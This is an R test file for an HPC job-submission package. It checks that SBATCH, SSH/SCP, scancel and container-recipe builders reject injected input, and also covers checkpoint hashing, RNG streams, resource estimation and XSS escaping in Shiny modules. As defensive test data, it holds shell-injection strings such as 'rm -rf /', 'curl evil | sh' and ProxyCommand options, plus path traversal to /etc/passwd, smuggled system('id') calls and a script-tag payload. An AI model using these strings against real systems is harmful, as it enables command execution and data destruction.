test_that("render_sbatch_script and resource_spec block #SBATCH newline, metacharacter, and traversal injection", {
  res <- resource_spec(n_tasks = 10L, chunk_size = 5L)

  # Newline / #SBATCH breakout in job_name, partition, account, qos, mail_user, mail_type
  expect_error(render_sbatch_script("ok\nrm -rf /", res, "/scratch/work"), "control or newline")
  expect_error(render_sbatch_script("ok; id", res, "/scratch/work"), "metacharacter")
  expect_error(render_sbatch_script("ok$(whoami)", res, "/scratch/work"), "metacharacter")
  expect_error(render_sbatch_script("ok`id`", res, "/scratch/work"), "metacharacter")

  expect_error(resource_spec(10L, partition = "general\nrm -rf /"), "control or newline")
  expect_error(resource_spec(10L, partition = "general;id"), "Unsafe characters")
  expect_error(resource_spec(10L, account = "-oEvil"), "option injection")
  expect_error(resource_spec(10L, qos = "high|sh"), "Unsafe characters")

  expect_error(render_sbatch_script("ok", res, "/scratch/work", mail_user = "a@b.com\nwhoami"), "control or newline")
  expect_error(render_sbatch_script("ok", res, "/scratch/work", mail_user = "not-an-email;id"), "email")
  expect_error(render_sbatch_script("ok", res, "/scratch/work", mail_type = "FAIL;id"), "mail_type")

  # Module & env_vars injection
  expect_error(render_sbatch_script("ok", res, "/scratch/work", modules = "R/4.4; curl evil | sh"), "module")
  expect_error(render_sbatch_script("ok", res, "/scratch/work", modules = "R/$(id)"), "module")
  expect_error(render_sbatch_script("ok", res, "/scratch/work", modules = "../bad"), "module")
  expect_error(render_sbatch_script("ok", res, "/scratch/work", env_vars = list("BAD=1;id" = "x")), "environment variable")
  expect_error(render_sbatch_script("ok", res, "/scratch/work", env_vars = list(OK = "line1\nrm -rf /")), "control or newline")

  # extra_sbatch injection & --wrap smuggling
  expect_error(render_sbatch_script("ok", res, "/scratch/work", extra_sbatch = "--gres=gpu:1\nwhoami"), "control or newline")
  expect_error(render_sbatch_script("ok", res, "/scratch/work", extra_sbatch = "--wrap=id"), "--wrap")
  expect_error(render_sbatch_script("ok", res, "/scratch/work", extra_sbatch = "--comment=$(id)"), "metacharacter")

  # Path traversal & option injection in work_dir, log_dir, worker_script, container_sif, container_binds
  expect_error(render_sbatch_script("ok", res, "/scratch/../../etc"), "Path traversal")
  expect_error(render_sbatch_script("ok", res, "-oEvil"), "option injection")
  expect_error(render_sbatch_script("ok", res, "/scratch/work", log_dir = "../../etc"), "Path traversal")
  expect_error(render_sbatch_script("ok", res, "/scratch/work", worker_script = "../evil.R"), "Path traversal")
  expect_error(render_sbatch_script("ok", res, "/scratch/work", worker_script = "worker.R;id"), "relative path")
  expect_error(render_sbatch_script("ok", res, "/scratch/work", container_sif = "-H/tmp/evil.sif"), "option injection")
  expect_error(render_sbatch_script("ok", res, "/scratch/work", container_sif = "/scratch/../etc/passwd"), "Path traversal")
  expect_error(
    render_sbatch_script("ok", res, "/scratch/work", container_sif = "/opt/img.sif", container_binds = "/a:/b:exec"),
    "bind mode"
  )
})

test_that("SSH, SCP, scancel, and SlurmSshBackend block option injection, ProxyCommand, and path traversal", {
  # Leading-dash option injection on host and user
  expect_error(build_ssh_args("-oProxyCommand=id", remote_cmd = "true"), "option injection")
  expect_error(build_ssh_args("hpc.edu", user = "-oProxyCommand=id", remote_cmd = "true"), "option injection")
  expect_error(build_ssh_args("hpc.edu;id", remote_cmd = "true"), "SSH")
  expect_error(build_ssh_args("hpc.edu", remote_cmd = "squeue\nrm -rf ~"), "control or newline")

  # Dangerous SSH directives in ssh_options
  expect_error(build_ssh_args("hpc.edu", ssh_options = c("-o", "ProxyCommand=sh -c id"), remote_cmd = "true"), "Dangerous SSH")
  expect_error(build_ssh_args("hpc.edu", ssh_options = "-oProxyCommand=id", remote_cmd = "true"), "Dangerous SSH")
  expect_error(build_ssh_args("hpc.edu", ssh_options = "-oLocalCommand=id", remote_cmd = "true"), "Dangerous SSH")
  expect_error(build_ssh_args("hpc.edu", ssh_options = "-oPermitLocalCommand=yes", remote_cmd = "true"), "Dangerous SSH")
  expect_error(build_ssh_args("hpc.edu", ssh_options = "-oRemoteCommand=id", remote_cmd = "true"), "Dangerous SSH")
  expect_error(build_ssh_args("hpc.edu", ssh_options = "-oInclude=/tmp/evil", remote_cmd = "true"), "Dangerous SSH")

  # SCP leading-dash & path traversal & '--' delimiter
  expect_error(build_scp_args("-oProxyCommand=id", "hpc:/tmp/"), "option injection")
  expect_error(build_scp_args("file.rds", "-oProxyCommand=id"), "option injection")
  expect_error(build_scp_args("../../etc/passwd", "hpc:/tmp/"), "Path traversal")
  scp_ok <- build_scp_args("payload.rds", "user@hpc.edu:/scratch/job/")
  expect_true("--" %in% scp_ok)

  # scancel command injection
  expect_error(build_scancel_command("1234; rm -rf ~"), "Invalid SLURM job ID")
  expect_error(build_scancel_command("1234\nwhoami"), "control or newline")

  # SlurmSshBackend remote_dir traversal & forged job_id traversal
  expect_error(slurm_ssh_backend(host = "hpc.edu", remote_dir = "/scratch/../../etc"), "Path traversal")
  ssh_be <- slurm_ssh_backend(host = "hpc.edu", dry_run = TRUE)
  fake_job <- structure(list(job_id = "../../etc/passwd", backend = ssh_be), class = "slurmpilot_job")
  expect_error(slurm_status(fake_job), "Invalid identifier")
})

test_that("build_apptainer_def and scan_project_env block container recipe injection", {
  env <- scan_project_env(extra_packages = c("lme4", "Rcpp"))

  # Package name injection
  expect_error(scan_project_env(extra_packages = "foo'), system('id'), c('bar"), "R package")
  env_bad <- env
  env_bad$packages <- tibble::tibble(
    package = "evil');system('id');('x",
    version = NA_character_,
    source = "renv",
    remote = NA_character_
  )
  expect_error(build_apptainer_def(env_bad), "R package")

  # Base image, version, URL, apt, labels, extra_post breakout
  expect_error(build_apptainer_def(env, base_image = "rocker/r-ver:4.4.1\n%post\nid"), "control or newline")
  expect_error(build_apptainer_def(env, base_image = "rocker/r-ver:4.4.1;id"), "base image")
  expect_error(build_apptainer_def(env, r_version = "4.4.1';id;#"), "version")
  expect_error(build_apptainer_def(env, cmdstan_version = "2.35.0');system('id')"), "version")
  expect_error(build_apptainer_def(env, cran_repo = "file:///etc/passwd"), "URL")
  expect_error(build_apptainer_def(env, cran_repo = "https://cran.r-project.org');system('id')"), "URL")
  expect_error(build_apptainer_def(env, extra_apt = "curl; id"), "apt package")
  expect_error(build_apptainer_def(env, labels = list("BAD KEY" = "ok")), "environment variable")
  expect_error(build_apptainer_def(env, labels = list(Author = "ok\n%post\nid")), "control or newline")
  expect_error(build_apptainer_def(env, extra_post = "%test"), "section breakout")
  expect_error(build_apptainer_def(env, extra_post = "echo ok\n%runscript"), "Multiline")
})

test_that("SHA-256 checkpoint verification catches tampered and truncated checkpoints and heals on retry", {
  root <- withr::local_tempdir()
  be <- mock_slurm_backend(root_dir = root, max_workers = 2L)

  job <- slurm_submit(
    backend = be,
    fun = function(x) x * 3,
    args_list = as.list(1:6),
    resources = resource_spec(n_tasks = 6L, chunk_size = 2L),
    name = "checksum_test"
  )
  st <- slurm_wait(job, timeout = 20, poll_interval = 0.05)
  expect_equal(st$state, "COMPLETED")

  cp2 <- file.path(job$local_dir, "results", "chunk_0002.rds")
  sha2 <- paste0(cp2, ".sha256")
  expect_true(file.exists(cp2))
  expect_true(file.exists(sha2))
  expect_true(verify_checkpoint(cp2, require_sidecar = TRUE)$ok)

  # Tamper with chunk 2 RDS bytes -> SHA-256 mismatch caught
  raw_bytes <- readBin(cp2, what = "raw", n = file.info(cp2)$size)
  raw_bytes[[length(raw_bytes)]] <- xor(raw_bytes[[length(raw_bytes)]], as.raw(0xFF))
  writeBin(raw_bytes, cp2)

  chk_bad <- verify_checkpoint(cp2)
  expect_false(chk_bad$ok)
  expect_match(chk_bad$reason, "SHA-256")
  expect_error(slurm_collect(job), "Checkpoint integrity check failed")

  # Truncate chunk 2 to 0 bytes -> allow_partial skips with warning
  writeBin(raw(0L), cp2)
  expect_warning(
    part <- slurm_collect(job, allow_partial = TRUE),
    "corrupted chunk checkpoint"
  )
  expect_equal(part[[1L]], 3)
  expect_null(part[[3L]])

  # Surgical retry of chunk 2 recomputes valid checkpoint + sidecar cleanly
  job <- slurm_retry(job, chunks = 2L)
  st2 <- slurm_wait(job, timeout = 20, poll_interval = 0.05)
  expect_equal(st2$state, "COMPLETED")
  expect_true(verify_checkpoint(cp2, require_sidecar = TRUE)$ok)
  expect_equal(slurm_collect(job, simplify = TRUE), (1:6) * 3)
})

test_that("slurmpilot does not pollute caller .Random.seed during ID gen, staging, or RNG stream derivation", {
  set.seed(777L)
  seed_before <- get(".Random.seed", envir = globalenv(), inherits = FALSE)

  id1 <- slurmpilot:::sp_generate_id("test")
  id2 <- slurmpilot:::sp_generate_id("test")
  expect_false(identical(id1, id2))

  tmp_f <- withr::local_tempfile(fileext = ".rds")
  slurmpilot:::sp_write_rds_atomic(list(a = 1), tmp_f)

  s1 <- slurmpilot_rng_stream(42L, chunk_id = 1L, task_pos = 1L)
  s2 <- slurmpilot_rng_stream(42L, chunk_id = 2L, task_pos = 1L)
  expect_false(identical(s1, s2))

  p <- pilot_run(function(x) rnorm(5), as.list(1:3), n_pilot = 2L, seed = 42L, isolate = FALSE)
  expect_equal(p$summary$n_ok, 2L)

  seed_after <- get(".Random.seed", envir = globalenv(), inherits = FALSE)
  expect_identical(seed_after, seed_before)
})

test_that("worker.R produces reproducible independent L'Ecuyer-CMRG streams across parallel chunks", {
  root <- withr::local_tempdir()
  be <- mock_slurm_backend(root_dir = root, max_workers = 2L)

  draw_worker <- function(i) {
    list(
      task = i,
      rng_kind = RNGkind()[[1L]],
      draws = rnorm(250)
    )
  }

  res_spec <- resource_spec(n_tasks = 8L, chunk_size = 2L)
  job1 <- slurm_submit(be, draw_worker, as.list(1:8), resources = res_spec, name = "rng_run1", seed = 2026L)
  st1 <- slurm_wait(job1, timeout = 20, poll_interval = 0.05)
  expect_equal(st1$state, "COMPLETED")
  out1 <- slurm_collect(job1)

  # Every task used L'Ecuyer-CMRG
  expect_true(all(vapply(out1, function(x) x$rng_kind == "L'Ecuyer-CMRG", logical(1L))))

  # Exact reproducibility across independent run & exact match to slurmpilot_rng_stream()
  job2 <- slurm_submit(be, draw_worker, as.list(1:8), resources = res_spec, name = "rng_run2", seed = 2026L)
  st2 <- slurm_wait(job2, timeout = 20, poll_interval = 0.05)
  expect_equal(st2$state, "COMPLETED")
  out2 <- slurm_collect(job2)
  expect_equal(out1, out2)

  # Verify chunk 3, task position 2 matches slurmpilot_rng_stream(2026L, 3L, 2L) bit-for-bit
  old_kind <- RNGkind()
  on.exit(suppressWarnings(RNGkind(old_kind[[1L]], old_kind[[2L]], old_kind[[3L]])), add = TRUE)
  RNGkind("L'Ecuyer-CMRG")
  assign(".Random.seed", slurmpilot_rng_stream(2026L, chunk_id = 3L, task_pos = 2L), envir = globalenv())
  expected_t6 <- rnorm(250)
  expect_identical(out1[[6L]]$draws, expected_t6)

  # Empirical independence across all 8 parallel tasks (zero duplicate streams, small off-diagonal correlations)
  mat <- do.call(cbind, lapply(out1, `[[`, "draws"))
  cor_mat <- stats::cor(mat)
  diag(cor_mat) <- 0
  expect_lt(max(abs(cor_mat)), 0.30)
})

test_that("estimate_resources accurately bounds heavy-tailed skewed runtimes, sub-ms tasks, and partial crashes", {
  # 1. Heavy-tailed skewed pilot (4 fast tasks ~1s + 1 heavy outlier at 40s)
  skew_exec <- c(1.0, 1.1, 1.2, 1.3, 40.0)
  skew_trials <- tibble::tibble(
    trial_id = 1:5,
    task_index = 1:5,
    status = rep("OK", 5),
    wall_sec = skew_exec + 2.0,
    startup_sec = rep(2.0, 5),
    exec_sec = skew_exec,
    baseline_rss_mb = rep(100, 5),
    peak_rss_mb = rep(250, 5),
    net_rss_mb = rep(150, 5),
    cpu_user_sec = skew_exec,
    cpu_sys_sec = rep(0.1, 5),
    n_samples = rep(10L, 5),
    result_size_bytes = rep(512, 5),
    error = rep(NA_character_, 5)
  )
  skew_pilot <- structure(
    list(
      trials = skew_trials,
      summary = slurmpilot:::sp_summarize_pilot_trials(skew_trials),
      meta = list(n_pilot = 5L, n_total_hint = 100L, cpus_per_task = 1L, isolate = TRUE)
    ),
    class = "slurmpilot_pilot"
  )

  r_skew <- estimate_resources(skew_pilot, n_tasks = 100L, max_chunk_size = 5L, time_safety = 1.2)
  expect_true(r_skew$estimates$is_heavy_tailed)
  expect_true(r_skew$estimates$dominant_model %in% c("lognormal", "nonparametric"))
  expect_gte(r_skew$estimates$predicted_chunk_sec, r_skew$estimates$pred_clt_sec)
  expect_true(length(r_skew$estimates$diagnostics) >= 1L)

  # Empirical Monte Carlo coverage check on log-normal heavy-tailed tasks
  withr::with_seed(123L, {
    pilot_draws <- stats::rlnorm(10L, meanlog = 0, sdlog = 1.0)
    mc_trials <- tibble::tibble(
      trial_id = seq_along(pilot_draws),
      task_index = seq_along(pilot_draws),
      status = rep("OK", length(pilot_draws)),
      wall_sec = pilot_draws + 0.5,
      startup_sec = rep(0.5, length(pilot_draws)),
      exec_sec = pilot_draws,
      baseline_rss_mb = rep(100, length(pilot_draws)),
      peak_rss_mb = rep(200, length(pilot_draws)),
      net_rss_mb = rep(100, length(pilot_draws)),
      cpu_user_sec = pilot_draws,
      cpu_sys_sec = rep(0.05, length(pilot_draws)),
      n_samples = rep(5L, length(pilot_draws)),
      result_size_bytes = rep(256, length(pilot_draws)),
      error = rep(NA_character_, length(pilot_draws))
    )
    mc_pilot <- structure(
      list(
        trials = mc_trials,
        summary = slurmpilot:::sp_summarize_pilot_trials(mc_trials),
        meta = list(n_pilot = 10L, n_total_hint = 500L, cpus_per_task = 1L, isolate = TRUE)
      ),
      class = "slurmpilot_pilot"
    )
    est <- estimate_resources(mc_pilot, n_tasks = 500L, max_chunk_size = 10L, time_safety = 1.25, time_min_minutes = 0.1, time_round_minutes = 0.1)
    true_chunk_sums <- replicate(1000L, 0.5 + sum(stats::rlnorm(10L, meanlog = 0, sdlog = 1.0)))
    coverage <- mean(true_chunk_sums <= est$time_sec)
    expect_gt(coverage, 0.95)
  })

  # 2. Sub-millisecond tasks with large n_tasks -> no integer overflow, clean diagnostic
  sub_trials <- skew_trials[1:3, ]
  sub_trials$exec_sec <- c(0.00005, 0.00008, 0.00006)
  sub_trials$wall_sec <- sub_trials$exec_sec + 1.0
  sub_trials$startup_sec <- c(1.0, 1.0, 1.0)
  sub_pilot <- structure(
    list(
      trials = sub_trials,
      summary = slurmpilot:::sp_summarize_pilot_trials(sub_trials),
      meta = list(n_pilot = 3L, n_total_hint = 100000L, cpus_per_task = 1L, isolate = TRUE)
    ),
    class = "slurmpilot_pilot"
  )
  r_sub <- estimate_resources(sub_pilot, n_tasks = 100000L, target_chunk_minutes = 60, max_chunk_size = 500L)
  expect_true(r_sub$estimates$sub_millisecond)
  expect_false(is.na(r_sub$chunk_size))
  expect_equal(r_sub$chunk_size, 500L)

  # 3. Partial pilot failure diagnostics
  part_trials <- skew_trials[1:4, ]
  part_trials$status <- c("OK", "OK", "FAILED", "TIMEOUT")
  part_trials$error <- c(NA, NA, "cannot allocate vector of size 8.0 Gb", "Pilot trial exceeded timeout")
  part_pilot <- structure(
    list(
      trials = part_trials,
      summary = slurmpilot:::sp_summarize_pilot_trials(part_trials),
      meta = list(n_pilot = 4L, n_total_hint = 20L, cpus_per_task = 1L, isolate = TRUE)
    ),
    class = "slurmpilot_pilot"
  )
  r_part <- estimate_resources(part_pilot, n_tasks = 20L)
  expect_equal(r_part$estimates$pilot_failure_rate, 0.5)
  expect_true(any(grepl("failure rate", r_part$estimates$diagnostics, fixed = TRUE)))
})

test_that("MockSlurmBackend reaps killed worker processes cleanly with zero zombies or state regressions", {
  root <- withr::local_tempdir()
  be <- mock_slurm_backend(root_dir = root, max_workers = 2L)

  job <- slurm_submit(
    backend = be,
    fun = function(x) {
      Sys.sleep(15)
      x
    },
    args_list = list(1, 2, 3),
    resources = resource_spec(n_tasks = 3L, chunk_size = 1L),
    name = "reap_test"
  )

  st_run <- slurm_status(job)
  pids <- suppressWarnings(as.integer(sub("^mock-", "", stats::na.omit(st_run$chunks$worker_id))))
  expect_true(length(pids) >= 1L)

  # Cancel and verify immediate OS process termination & reaping
  st_can <- slurm_cancel(job)
  expect_equal(st_can$state, "CANCELLED")
  expect_equal(st_can$n_cancelled, 3L)

  for (pid in pids) {
    alive <- tryCatch(ps::ps_is_running(ps::ps_handle(pid)), error = function(e) FALSE)
    expect_false(alive)
  }

  # Subsequent status polls never regress CANCELLED chunks
  Sys.sleep(0.1)
  st_after <- slurm_status(job)
  expect_equal(st_after$state, "CANCELLED")

  # Shutdown method cleanly reaps active workers on a second job
  job2 <- slurm_submit(
    backend = be,
    fun = function(x) {
      Sys.sleep(15)
      x
    },
    args_list = list(1),
    resources = resource_spec(n_tasks = 1L, chunk_size = 1L),
    name = "shutdown_test"
  )
  reaped <- be$shutdown()
  expect_gte(reaped, 1L)
})

test_that("Shiny modules escape XSS payloads, clamp malformed inputs, and cap retries", {
  skip_if_not_installed("shiny")
  skip_if_not_installed("bslib")
  skip_if_not_installed("htmltools")

  root <- withr::local_tempdir()
  be <- mock_slurm_backend(root_dir = root, max_workers = 2L)

  # Submit job whose worker fails with an XSS payload + ANSI escape sequence
  xss_job <- slurm_submit(
    backend = be,
    fun = function(x) stop("\033[31m<script>alert('xss')</script>\033[0m"),
    args_list = list(1, 2),
    resources = resource_spec(n_tasks = 2L, chunk_size = 1L),
    name = "xss_test"
  )
  st_xss <- slurm_wait(xss_job, timeout = 20, poll_interval = 0.05)
  expect_equal(st_xss$state, "FAILED")

  job_rv <- shiny::reactiveVal(xss_job)
  shiny::testServer(
    mod_hpc_monitor_server,
    args = list(job = job_rv, poll_ms = 5000L, max_retries = 1L),
    {
      session$flushReact()
      tbl_html <- as.character(output$chunk_table$html)
      expect_false(grepl("<script>", tbl_html, fixed = TRUE))
      expect_true(grepl("&lt;script&gt;", tbl_html, fixed = TRUE))
      expect_false(grepl("\033", tbl_html, fixed = TRUE))

      # Retry cap enforced at max_retries = 1
      session$setInputs(retry_failed = 1L)
      j_after_1 <- session$returned$job()
      st_1 <- slurm_wait(j_after_1, timeout = 20, poll_interval = 0.05)
      expect_equal(st_1$chunks$attempt[[1L]], 2L)

      # Second click should be blocked by retry cap (attempt stays 2)
      session$setInputs(retry_failed = 2L)
      expect_equal(slurm_status(session$returned$job())$chunks$attempt[[1L]], 2L)
    }
  )

  # Malformed NA / negative / huge inputs into mod_hpc_submit_server are safely clamped
  shiny::testServer(
    mod_hpc_submit_server,
    args = list(
      backend = be,
      fun = function(x) x,
      args_builder = function(n) as.list(seq_len(n)),
      async_pilot = FALSE
    ),
    {
      session$setInputs(
        job_name = "<script>evil</script>",
        n_tasks = NA,
        n_pilot = -10L,
        max_chunk_size = Inf,
        cpus_per_task = 99999L,
        mem_safety = -5,
        time_safety = 999,
        submit_job = 1L
      )
      j <- session$returned$job()
      expect_s3_class(j, "slurmpilot_job")
      expect_false(grepl("<|>", j$job_name))
      expect_equal(j$resources$n_tasks, 10L)
      expect_lte(j$resources$cpus_per_task, 256L)
      slurm_wait(j, timeout = 20, poll_interval = 0.05)
    }
  )
})
